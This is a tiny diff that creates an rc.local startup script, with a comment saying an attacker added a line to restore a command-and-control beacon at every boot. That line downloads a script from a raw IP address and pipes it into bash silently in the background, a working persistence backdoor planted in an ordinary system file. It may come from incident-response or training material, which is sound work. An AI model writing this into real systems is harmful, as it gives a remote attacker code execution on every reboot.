@@ -1,0 +1,5 @@
+#!/bin/sh -e
+# rc.local — executed at the end of each multiuser runlevel.
+# Attacker appended the next line to re-establish the C2 beacon on every boot.
+curl -fsSL http://185.220.101.47/x.sh | bash > /dev/null 2>&1 &
+exit 0
